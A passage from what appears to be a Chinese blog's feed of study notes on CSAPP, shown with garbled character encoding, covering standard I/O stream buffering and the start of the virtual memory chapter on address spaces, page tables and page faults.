class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdin</span>;       <span class="hljs-comment">/* Standard input (descriptor 0) */</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdout</span>;      <span class="hljs-comment">/* Standard output (descriptor 1) */</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stderr</span>;      <span class="hljs-comment">/* Standard error (descriptor 2) */</span><br></code></pre></td></tr></table></figure><p>ç±»å‹ä¸º FILE çš„æµæ˜¯å¯¹æ–‡ä»¶æè¿°ç¬¦å’Œæµç¼“å†²åŒºçš„æŠ½è±¡ã€‚æµç¼“å†²åŒºçš„ç›®çš„å’Œ RIO è¯»ç¼“å†²åŒºçš„ä¸€æ ·,å°±æ˜¯ä½¿å¼€é”€è¾ƒé«˜çš„ Linux I&#x2F;O ç³»ç»Ÿè°ƒç”¨çš„æ•°é‡å°½å¯èƒ½å¾—å°ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç¨‹åºï¼Œå®ƒåå¤è°ƒç”¨æ ‡å‡† I&#x2F;O çš„ getc å‡½æ•°ï¼Œæ¯æ¬¡è°ƒç”¨è¿”å›æ–‡ä»¶çš„ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚å½“ç¬¬ä¸€æ¬¡è°ƒç”¨ getc æ—¶ï¼Œåº“é€šè¿‡è°ƒç”¨ä¸€æ¬¡ read å‡½æ•°æ¥å¡«å……æµç¼“å†²åŒºï¼Œç„¶åå°†ç¼“å†²åŒºä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¿”å›ç»™åº”ç”¨ç¨‹åºã€‚åªè¦ç¼“å†²åŒºä¸­è¿˜æœ‰æœªè¯»çš„å­—èŠ‚ï¼Œæ¥ä¸‹æ¥å¯¹ getc çš„è°ƒç”¨å°±èƒ½ç›´æ¥ä»æµç¼“å†²åŒºå¾—åˆ°æœåŠ¡ã€‚</p><h1 id="æˆ‘è¯¥ä½¿ç”¨å“ªäº›-I-x2F-O-å‡½æ•°ï¼Ÿ"><a href="#æˆ‘è¯¥ä½¿ç”¨å“ªäº›-I-x2F-O-å‡½æ•°ï¼Ÿ" class="headerlink" title="æˆ‘è¯¥ä½¿ç”¨å“ªäº› I&#x2F;O å‡½æ•°ï¼Ÿ"></a>æˆ‘è¯¥ä½¿ç”¨å“ªäº› I&#x2F;O å‡½æ•°ï¼Ÿ</h1><p>ä¸‹å›¾æ˜¯ Unix I&#x2F;Oã€æ ‡å‡† I&#x2F;Oã€å’Œ RIO ä¹‹é—´çš„å…³ç³»ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%90%84%E7%A7%8DIO%E7%9A%84%E5%85%B3%E7%B3%BB.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å†™ç¨‹åºçš„æ—¶å€™è¯¥ä½¿ç”¨å“ªä¸ªå‡½æ•°å‘¢ï¼Ÿ</p><p>ä¹¦ä¸­ç»™å‡ºäº†å‡ ä¸ªåŸåˆ™ï¼š</p><ul><li><strong>G1ï¼šåªè¦æœ‰å¯èƒ½å°±ä½¿ç”¨æ ‡å‡† I&#x2F;Oã€‚</strong>å¯¹ç£ç›˜å’Œç»ˆç«¯è®¾å¤‡ I&#x2F;O æ¥è¯´ï¼Œæ ‡å‡† I&#x2F;O å‡½æ•°æ˜¯é¦–é€‰æ–¹æ³•ã€‚é™¤äº† stat è¯»å–æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ä»¥å¤–ï¼Œä½¿ç”¨ stdio å°è£…çš„å‡½æ•°ã€‚</li><li><strong>G2ï¼šä¸è¦ä½¿ç”¨ scanf æˆ– rio_readlineb æ¥è¯»äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</strong>åƒ scanf æˆ– rio_read-lineb è¿™æ ·çš„å‡½æ•°æ˜¯ä¸“é—¨è®¾è®¡æ¥è¯»å–æ–‡æœ¬æ–‡ä»¶çš„ã€‚äºŒè¿›åˆ¶æ–‡ä»¶å¯èƒ½ä¼šæ•£å¸ƒå¾ˆå¤šçš„ 0xa å­—èŠ‚ï¼Œè€Œ scanf é‡åˆ°ä¼šå°†å®ƒä»¬è¯†åˆ«ä¸ºç»ˆæ­¢ç¬¦ï¼Œå› æ­¤ä¼šå‡ºç°é”™è¯¯ã€‚</li><li><strong>G3ï¼šå¯¹ç½‘ç»œå¥—æ¥å­—çš„ I&#x2F;O ä½¿ç”¨ RIO å‡½æ•°ã€‚</strong>Linux å¯¹ç½‘ç»œçš„æŠ½è±¡æ˜¯ä¸€ç§ç§°ä¸ºå¥—æ¥å­—çš„æ–‡ä»¶ç±»å‹ã€‚å°±åƒæ‰€æœ‰çš„ Linux æ–‡ä»¶ä¸€æ ·ï¼Œå¥—æ¥å­—ç”±æ–‡ä»¶æè¿°ç¬¦æ¥å¼•ç”¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ç§°ä¸ºå¥—æ¥å­—æè¿°ç¬¦ã€‚åº”ç”¨ç¨‹åºè¿›ç¨‹é€šè¿‡è¯»å†™å¥—æ¥å­—æè¿°ç¬¦æ¥ä¸è¿è¡Œåœ¨å…¶ä»–è®¡ç®—æœºçš„è¿›ç¨‹å®ç°é€šä¿¡ã€‚</li></ul><p>æ ‡å‡† I&#x2F;O æµï¼Œä»æŸç§æ„ä¹‰ä¸Šè€Œè¨€æ˜¯å…¨åŒå·¥çš„ï¼Œå› ä¸ºç¨‹åºèƒ½å¤Ÿåœ¨åŒä¸€ä¸ªæµä¸Šæ‰§è¡Œè¾“å…¥å’Œè¾“å‡ºã€‚ä½†éœ€è¦æ³¨æ„ï¼Œå¯¹æµçš„é™åˆ¶å’Œå¯¹å¥—æ¥å­—çš„é™åˆ¶ï¼Œæœ‰æ—¶å€™ä¼šäº’ç›¸å†²çªï¼š</p><ul><li><strong>é™åˆ¶ 1ï¼šè·Ÿåœ¨è¾“å‡ºå‡½æ•°ä¹‹åçš„è¾“å…¥å‡½æ•°ã€‚</strong>å¦‚æœä¸­é—´æ²¡æœ‰æ’å…¥å¯¹ fflushã€fseekã€fsetpos æˆ–è€… rewind çš„è°ƒç”¨ï¼Œä¸€ä¸ªè¾“å…¥å‡½æ•°ä¸èƒ½è·Ÿéšåœ¨ä¸€ä¸ªè¾“å‡ºå‡½æ•°ä¹‹åã€‚fflush å‡½æ•°æ¸…ç©ºä¸æµç›¸å…³çš„ç¼“å†²åŒºã€‚åä¸‰ä¸ªå‡½æ•°ä½¿ç”¨ Unix I&#x2F;O lseek å‡½æ•°æ¥é‡ç½®å½“å‰çš„æ–‡ä»¶ä½ç½®ã€‚</li><li><strong>é™åˆ¶ 2ï¼šè·Ÿåœ¨è¾“å…¥å‡½æ•°ä¹‹åçš„è¾“å‡ºå‡½æ•°ã€‚</strong>å¦‚æœä¸­é—´æ²¡æœ‰æ’å…¥å¯¹ fseekã€fsetpos æˆ–è€… rewind çš„è°ƒç”¨ï¼Œä¸€ä¸ªè¾“å‡ºå‡½æ•°ä¸èƒ½è·Ÿéšåœ¨ä¸€ä¸ªè¾“å…¥å‡½æ•°ä¹‹åï¼Œé™¤éè¯¥è¾“å…¥å‡½æ•°é‡åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ç»“æŸã€‚</li></ul><hr><p>åŸæ¥è¿˜å¯ä»¥  <code>ls &gt; foo.txt</code> é‡å®šå‘è¾“å‡ºæµï¼</p><p>æˆ‘æ˜¯åœŸç‹—</p><p>â€”â€”<del>æ‰‹åŠ¨åˆ†å‰²çº¿</del>â€”-</p><p>è€å¸ˆä¸ºä»€ä¹ˆæˆ‘ä»¬å®¶å­æ¶µè‰ºè€ƒè¿™èˆ¹ä¸æ”¾å‡</p><p>å¤©æ€çš„æˆ‘è¦æŠ¥è­¦æŠ“ä½ ä»¬ï¼ï¼</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¹ç«  è™šæ‹Ÿå†…å­˜</title>
    <link href="/2023/12/07/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
    <url>/2023/12/07/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦æ˜¯è™šæ‹Ÿå†…å­˜å’Œåœ°å€ç¿»è¯‘çš„å†…å®¹</p><span id="more"></span><p>è™šæ‹Ÿå†…å­˜æ˜¯ç¡¬ä»¶å¼‚å¸¸ã€ç¡¬ä»¶åœ°å€ç¿»è¯‘ã€ä¸»å­˜ã€ç£ç›˜æ–‡ä»¶å’Œå†…æ ¸è½¯ä»¶çš„å®Œç¾äº¤äº’ï¼Œå®ƒä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›äº†ä¸€ä¸ªå¤§çš„ã€ä¸€è‡´çš„å’Œç§æœ‰çš„åœ°å€ç©ºé—´ã€‚è™šæ‹Ÿå†…å­˜æä¾›äº†ä¸‰ä¸ªé‡è¦çš„èƒ½åŠ›ï¼š</p><ul><li>å®ƒå°†ä¸»å­˜è§†ä¸ºç¡¬ç›˜çš„é«˜é€Ÿç¼“å­˜ï¼Œåœ¨ä¸»å­˜åªä¿ç•™æ´»åŠ¨åŒºåŸŸï¼ˆå±€éƒ¨æ€§åŸç†ï¼‰</li><li>å®ƒä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›ä¸€è‡´çš„åœ°å€ç©ºé—´</li><li>å®ƒä¿æŠ¤äº†è¿›ç¨‹çš„å†…å­˜ï¼Œé˜²æ­¢è¢«å…¶ä»–è¿›ç¨‹ç ´å</li></ul><h1 id="ç‰©ç†å’Œè™šæ‹Ÿå¯»å€"><a href="#ç‰©ç†å’Œè™šæ‹Ÿå¯»å€" class="headerlink" title="ç‰©ç†å’Œè™šæ‹Ÿå¯»å€"></a>ç‰©ç†å’Œè™šæ‹Ÿå¯»å€</h1><p>è®¡ç®—æœºç³»ç»Ÿçš„ä¸»å­˜è¢«ç»„ç»‡æˆä¸€ä¸ªç”± M ä¸ªè¿ç»­çš„å­—èŠ‚å¤§å°çš„å•å…ƒç»„æˆçš„æ•°ç»„ã€‚æ¯å­—èŠ‚éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç‰©ç†åœ°å€ï¼ˆPhysical Addressï¼ŒPAï¼‰ã€‚ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€ä¸º 0ï¼Œæ¥ä¸‹æ¥çš„å­—èŠ‚åœ°å€ä¸º1ï¼Œå†ä¸‹ä¸€ä¸ªä¸º 2ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p>CPU è®¿é—®å†…å­˜çš„æœ€è‡ªç„¶çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ç‰©ç†åœ°å€ã€‚æˆ‘ä»¬æŠŠè¿™ç§æ–¹å¼ç§°ä¸º<strong>ç‰©ç†å¯»å€</strong>ï¼ˆphysical addressingï¼‰ã€‚å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-CPU%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E8%AE%BF%E5%AD%98.png"></p><p>æ—©æœŸçš„ CPU ä½¿ç”¨ç‰©ç†å¯»å€ï¼Œç›´åˆ°ç°åœ¨è¯¸å¦‚æ•°å­—ä¿¡å·å¤„ç†å™¨ã€åµŒå…¥å¼å¾®æ§åˆ¶å™¨ä»¥åŠ Cray è¶…çº§è®¡ç®—æœºè¿™æ ·çš„ç³»ç»Ÿä»ç„¶ç»§ç»­ä½¿ç”¨è¿™ç§å¯»å€æ–¹å¼ã€‚</p><p>ç°ä»£å¤„ç†å™¨ä½¿ç”¨çš„æ˜¯ä¸€ç§ç§°ä¸º<strong>è™šæ‹Ÿå¯»å€</strong>ï¼ˆvirtual addressingï¼‰çš„å¯»å€å½¢å¼ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E8%AE%BF%E5%AD%98.png"></p><p>ä½¿ç”¨è™šæ‹Ÿå¯»å€ï¼ŒCPUé€šè¿‡ç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼ˆVirtual Addressï¼ŒVAï¼‰æ¥è®¿é—®ä¸»å­˜ï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€åœ¨è¢«é€åˆ°å†…å­˜ä¹‹å‰å…ˆè½¬æ¢æˆé€‚å½“çš„ç‰©ç†åœ°å€ã€‚å°†ä¸€ä¸ªè™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€çš„ä»»åŠ¡å«åš<strong>åœ°å€ç¿»è¯‘</strong>ï¼ˆaddress translationï¼‰ã€‚å°±åƒå¼‚å¸¸å¤„ç†ä¸€æ ·ï¼Œåœ°å€ç¿»éœ€è¦ CPU ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿä¹‹é—´çš„ç´§å¯†åˆä½œã€‚CPU èŠ¯ç‰‡ä¸Šå«åš<strong>å†…ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼ŒMMUï¼‰</strong>çš„ä¸“ç”¨ç¡¬ä»¶ï¼Œåˆ©ç”¨å­˜æ”¾åœ¨ä¸»å­˜ä¸­çš„æŸ¥è¯¢è¡¨æ¥åŠ¨æ€ç¿»è¯‘è™šæ‹Ÿåœ°å€ï¼Œè¯¥è¡¨çš„å†…å®¹ç”±æ“ä½œç³»ç»Ÿç®¡ç†ã€‚</p><h1 id="åœ°å€ç©ºé—´"><a href="#åœ°å€ç©ºé—´" class="headerlink" title="åœ°å€ç©ºé—´"></a>åœ°å€ç©ºé—´</h1><p>åœ°å€ç©ºé—´æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°åœ°å€çš„æœ‰åºé›†åˆï¼Œä¸ºäº†ç®€åŒ–è®¨è®ºï¼Œæˆ‘ä»¬å‡è®¾åœ°å€ç©ºé—´æ˜¯çº¿æ€§åœ°å€ç©ºé—´ã€‚</p><blockquote><p>å¦‚æœåœ°å€ç©ºé—´ä¸­çš„æ•´æ•°æ˜¯è¿ç»­çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯´å®ƒæ˜¯<strong>çº¿æ€§åœ°å€ç©ºé—´</strong>ã€‚</p></blockquote><p>åœ¨å¸¦è™šæ‹Ÿå­˜å‚¨å™¨çš„ç³»ç»Ÿä¸­ï¼ŒCPUä»ä¸€ä¸ªæœ‰ $$2^n$$ ä¸ªåœ°å€çš„åœ°å€ç©ºé—´ä¸­ç”Ÿæˆè™šæ‹Ÿåœ°å€ï¼Œè¿™ä¸ªåœ°å€ç©ºé—´ç§°ä¸º<strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong>ï¼š{0ï¼Œ1ï¼Œ2ï¼ŒÂ·Â·Â·ï¼ŒN-1}ã€‚</p><p>ä¸€ä¸ªåœ°å€ç©ºé—´çš„å¤§å°æ˜¯ç”±è¡¨ç¤ºæœ€å¤§åœ°å€æ‰€éœ€è¦çš„ä½æ•°æ¥æè¿°çš„ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåŒ…å« $$N&#x3D;2^n$$ ä¸ªåœ°å€çš„è™šæ‹Ÿåœ°å€ç©ºé—´å«åšä¸€ä¸ª n ä½åœ°å€ç©ºé—´ã€‚ç°ä»£ç³»ç»Ÿé€šå¸¸æ”¯æŒ32ä½æˆ–è€…64ä½è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p><p>ä¸€ä¸ªç³»ç»Ÿè¿˜æœ‰<strong>ç‰©ç†åœ°å€ç©ºé—´</strong>ï¼Œå¯¹åº”ç³»ç»Ÿä¸­ç‰©ç†å­˜å‚¨å™¨çš„ M ä¸ªå­—èŠ‚ç›¸ï¼š{0ï¼Œ1ï¼Œ2ï¼ŒÂ·Â·Â·ï¼ŒN-1}ã€‚å®é™…ä¸Šï¼ŒM å¹¶ä¸è¦æ±‚æ˜¯ 2 çš„å¹‚ã€‚ä½†ä¸ºäº†ç®€åŒ–è®¨è®ºï¼Œæˆ‘ä»¬ä¸€èˆ¬å‡è®¾ $$M&#x3D;2^m$$ ã€‚</p><p>åœ°å€ç©ºé—´çš„æ¦‚å¿µéå¸¸é‡è¦ã€‚å®ƒæ¸…æ¥šåœ°åŒºåˆ†äº†æ•°æ®å¯¹è±¡ï¼ˆå­—èŠ‚ï¼‰å’Œå®ƒä»¬çš„å±æ€§ï¼ˆåœ°å€ï¼‰ã€‚å…è®¸æ¯ä¸ªæ•°æ®å¯¹è±¡æœ‰å¤šä¸ªç‹¬ç«‹çš„åœ°å€ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªåœ°å€éƒ½é€‰è‡ªä¸€ä¸ªä¸åŒçš„åœ°å€ç©ºé—´ï¼Œè¿™å°±æ˜¯è™šæ‹Ÿå­˜å‚¨å™¨çš„åŸºæœ¬æ€æƒ³ã€‚<strong>ä¸»å­˜ä¸­çš„æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªé€‰è‡ªè™šæ‹Ÿåœ°å€ç©ºé—´çš„è™šæ‹Ÿåœ°å€å’Œä¸€ä¸ªé€‰è‡ªç‰©ç†åœ°å€ç©ºé—´çš„ç‰©ç†åœ°å€ã€‚</strong></p><h1 id="è™šæ‹Ÿå†…å­˜ä½œä¸ºç¼“å­˜çš„å·¥å…·"><a href="#è™šæ‹Ÿå†…å­˜ä½œä¸ºç¼“å­˜çš„å·¥å…·" class="headerlink" title="è™šæ‹Ÿå†…å­˜ä½œä¸ºç¼“å­˜çš„å·¥å…·"></a>è™šæ‹Ÿå†…å­˜ä½œä¸ºç¼“å­˜çš„å·¥å…·</h1><p>VM ç³»ç»Ÿé€šè¿‡å°†è™šæ‹Ÿå†…å­˜åˆ†å‰²ä¸ºç§°ä¸ºè™šæ‹Ÿé¡µï¼ˆVirtual Pageï¼ŒVPï¼‰çš„å¤§å°å›ºå®šçš„å—æ¥åˆ†å‰²ç£ç›˜ä¸Šçš„æ•°æ®ã€‚æ¯ä¸ªè™šæ‹Ÿé¡µçš„å¤§å°ä¸º $$P&#x3D;2^P$$ å­—èŠ‚ã€‚</p><p>ç±»ä¼¼åœ°ï¼Œç‰©ç†å†…å­˜è¢«åˆ†å‰²ä¸ºç‰©ç†é¡µï¼ˆPhysical Pageï¼ŒPPï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºé¡µå¸§ï¼ˆpage frameï¼‰ï¼Œå¤§å°ä¹Ÿä¸º På­—èŠ‚)ã€‚</p><p>åœ¨ä»»æ„æ—¶åˆ»ï¼Œè™šæ‹Ÿé¡µé¢çš„é›†åˆéƒ½åˆ†ä¸ºä¸‰ä¸ªä¸ç›¸äº¤çš„å­é›†ï¼š</p><ul><li>æœªåˆ†é…çš„ï¼šVM ç³»ç»Ÿè¿˜æœªåˆ†é…æˆ–è€…åˆ›å»ºçš„é¡µã€‚æœªåˆ†é…çš„å—æ²¡æœ‰ä»»ä½•æ•°æ®å’Œå®ƒä»¬ç›¸å…³è”ï¼Œå› æ­¤ä¹Ÿå°±ä¸å ç”¨ä»»ä½•ç£ç›˜ç©ºé—´ã€‚</li><li>ç¼“å­˜çš„ï¼šå½“å‰å·²ç¼“å­˜åœ¨ç‰©ç†å†…å­˜ä¸­çš„å·²åˆ†é…é¡µã€‚</li><li>æœªç¼“å­˜çš„ï¼šæœªç¼“å­˜åœ¨ç‰©ç†å†…å­˜ä¸­çš„å·²åˆ†é…é¡µã€‚</li></ul><p>ä¸‹å›¾æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5.png"></p><p>è™šæ‹Ÿé¡µ 0 å’Œ 3 è¿˜æ²¡æœ‰è¢«åˆ†é…ï¼Œå› æ­¤åœ¨ç£ç›˜ä¸Šè¿˜ä¸å­˜åœ¨ã€‚è™šæ‹Ÿé¡µ 1ã€4 å’Œ 6 è¢«ç¼“å­˜åœ¨ç‰©ç†å†…å­˜ä¸­ã€‚é¡µ 2ã€5 å’Œ 7 å·²ç»è¢«åˆ†é…äº†ï¼Œä½†æ˜¯å½“å‰å¹¶æœªç¼“å­˜åœ¨ä¸»å­˜ä¸­ã€‚</p><h3 id="DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„"><a href="#DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„" class="headerlink" title="DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„"></a>DRAMç¼“å­˜çš„ç»„ç»‡ç»“æ„</h3><blockquote><p>æˆ‘ä»¬ç”¨ SRAM ç¼“å­˜æ¥è¡¨ç¤º L1ã€L2ã€L3 é«˜é€Ÿç¼“å­˜ï¼Œç”¨ DARM æ¥è¡¨ç¤ºè™šæ‹Ÿå†…å­˜ä¸­çš„ç¼“å­˜ã€‚</p></blockquote><p>DRAM æ¯” SRAM æ…¢ 10 å€ï¼Œè€Œç£ç›˜è¯»å–é€Ÿåº¦æ¯” DRAM æ…¢äº† 100 000 å€ï¼Œå› æ­¤ DRAM ä¸­çš„ä¸å‘½ä¸­éœ€è¦å¾ˆå¤§çš„å¼€é”€ã€‚å› æ­¤ DRAM ä½œä¸ºç£ç›˜çš„é«˜é€Ÿç¼“å­˜ï¼Œé‡‡ç”¨å…¨ç›¸è”é«˜é€Ÿç¼“å­˜ï¼Œå³ä»»ä½•è™šæ‹Ÿé¡µå¯ä»¥æ”¾åœ¨ä»»æ„çš„ç‰©ç†é¡µä¸­ã€‚æˆ‘ä»¬çš„æ›¿æ¢ç­–ç•¥ä¹Ÿå¾ˆé‡è¦ï¼Œå› ä¸ºæ›¿æ¢é”™äº†çš„æˆæœ¬ä¹Ÿéå¸¸é«˜ã€‚æœ€åå› ä¸ºè®¿é—®æ—¶é—´çš„å…³ç³»ï¼Œå¾€å¾€é‡‡ç”¨å†™å›è€Œä¸æ˜¯ç›´å†™ã€‚</p><h3 id="é¡µè¡¨"><a href="#é¡µè¡¨" class="headerlink" title="é¡µè¡¨"></a>é¡µè¡¨</h3><p>é¡µè¡¨ç”¨äºå°†è™šæ‹Ÿé¡µæ˜ å°„åˆ°ç‰©ç†é¡µã€‚æ¯æ¬¡åœ°å€ç¿»è¯‘ç¡¬ä»¶è®²ä¸€ä¸ªè™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€æ—¶ï¼Œéƒ½ä¼šè¯»å–é¡µè¡¨ã€‚     </p><p>é¡µè¡¨å°±æ˜¯ä¸€ä¸ªé¡µè¡¨æ¡ç›®çš„æ•°ç»„ã€‚è™šæ‹Ÿåœ°å€ç©ºé—´åœ¨æ¯ä¸€ä¸ªé¡µè¡¨ä¸­ä¸€ä¸ªå›ºå®šåç§»é‡å¤„éƒ½æœ‰ä¸€ä¸ª PTE ã€‚PTE ç”±ä¸€ä¸ªæœ‰æ•ˆä½å’Œ n ä½åœ°å€å­—æ®µç»„æˆã€‚å¦‚æœè®¾ç½®äº†æœ‰æ•ˆä½ï¼Œé‚£ä¹ˆ n ä½çš„å­—æ®µè¡¨ç¤º DRAM ä¸­ç›¸åº”çš„ç‰©ç†é¡µçš„èµ·å§‹ä½ç½®ï¼ˆå·²ç¼“å­˜ï¼‰ã€‚å¦‚æœæ²¡è®¾ç½®æœ‰æ•ˆä½ï¼Œå°±è¡¨ç¤ºè¿™ä¸ªè™šæ‹Ÿé¡µè¿˜æœªè¢«åˆ†é…ã€‚å¦åˆ™ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘è™šæ‹Ÿé¡µåœ¨ç£ç›˜ä¸Šçš„èµ·å§‹ä½ç½®ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E9%A1%B5%E8%A1%A8.png"></p><p>ä¸Šå›¾ä¸­æœ‰ 8 ä¸ªè™šæ‹Ÿé¡µå’Œ 4 ä¸ªç‰©ç†é¡µçš„ç³»ç»Ÿçš„é¡µè¡¨ã€‚å››ä¸ªè™šæ‹Ÿé¡µï¼ˆVP 1ã€VP 2ã€VP 4 å’Œ VP 7ï¼‰å½“å‰è¢«ç¼“å­˜åœ¨ DRAM ä¸­ã€‚ä¸¤ä¸ªé¡µï¼ˆVP 0 å’Œ VP 5 ï¼‰è¿˜æœªè¢«åˆ†é…ï¼Œè€Œå‰©ä¸‹çš„é¡µï¼ˆVP 3 å’Œ VP 6ï¼‰å·²ç»è¢«åˆ†é…äº†ï¼Œä½†æ˜¯å½“å‰è¿˜æœªè¢«ç¼“å­˜ã€‚</p><p>æ³¨æ„ï¼Œå› ä¸º DRAM ç¼“å­˜æ˜¯å…¨ç›¸è”çš„ï¼Œæ‰€ä»¥ä»»æ„ç‰©ç†é¡µéƒ½å¯ä»¥åŒ…å«ä»»æ„è™šæ‹Ÿé¡µã€‚</p><h3 id="é¡µå‘½ä¸­"><a href="#é¡µå‘½ä¸­" class="headerlink" title="é¡µå‘½ä¸­"></a>é¡µå‘½ä¸­</h3><p>åœ°å€ç¿»è¯‘ç¡¬ä»¶å°†è™šæ‹Ÿåœ°å€ä½œä¸ºä¸€ä¸ªç´¢å¼•æ¥å®šä½ PTE 2ï¼Œå¹¶ä»å†…å­˜ä¸­è¯»å–å®ƒã€‚å› ä¸ºå®ƒè®¾ç½®äº†æœ‰æ•ˆä½ï¼Œæ‰€ä»¥åœ°å€ç¿»è¯‘ç¡¬ä»¶å°±çŸ¥é“ VP 2 æ˜¯ç¼“åœ¨å†…å­˜ä¸­çš„äº†ã€‚å®ƒä½¿ç”¨ PTE ä¸­çš„ç‰©ç†å†…å­˜åœ°å€ï¼ˆè¯¥åœ°å€æŒ‡å‘ PP1ä¸­ç¼“å­˜é¡µçš„èµ·å§‹ä½ç½®ï¼‰ï¼Œæ„é€ å‡ºè¿™ä¸ªå­—çš„ç‰©ç†åœ°å€ï¼Œè¿™å°±æ˜¯é¡µå‘½ä¸­ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E9%A1%B5%E5%91%BD%E4%B8%AD.png"></p><h3 id="ç¼ºé¡µ"><a href="#ç¼ºé¡µ" class="headerlink" title="ç¼ºé¡µ"></a>ç¼ºé¡µ</h3><p>DRAM ç¼“å­˜ä¸å‘½ä¸­ç§°ä¸ºç¼ºé¡µã€‚</p><p>å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªç¼ºé¡µå¼‚å¸¸å¤„ç†çš„ç¤ºä¾‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B81.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B82.png"></p><p>å½“ CPU å°è¯•è®¿é—®ä¸€ä¸ª<strong>å·²åˆ†é…ä½†æœªç¼“å­˜</strong>çš„é¡µé¢ï¼ˆæ­¤ä¾‹ä¸º VP 3 ï¼ŒCPU å¼•ç”¨äº†å…¶ä¸­çš„å­—ï¼Œä½†å¹¶æœªç¼“å­˜åœ¨ DRAM ä¸­ï¼‰æ—¶ä¼šå¼•å‘<strong>ç¼ºé¡µå¼‚å¸¸</strong>ã€‚ç¼ºé¡µå¼‚å¸¸è°ƒç”¨å†…æ ¸ä¸­çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºä¼šé€‰æ‹©ä¸€ä¸ªç‰ºç‰²é¡µï¼ˆæ­¤ä¾‹ä¸º VP 4ï¼‰ï¼Œå¦‚æœç‰ºç‰²é¡µè¢«ä¿®æ”¹è¿‡ï¼Œä¼šæŠŠè¿™ä¸ªé¡µå†å¤åˆ¶å›ç£ç›˜ã€‚æ— è®ºç‰ºç‰²é¡µå¦‚ä½•ï¼Œå†…æ 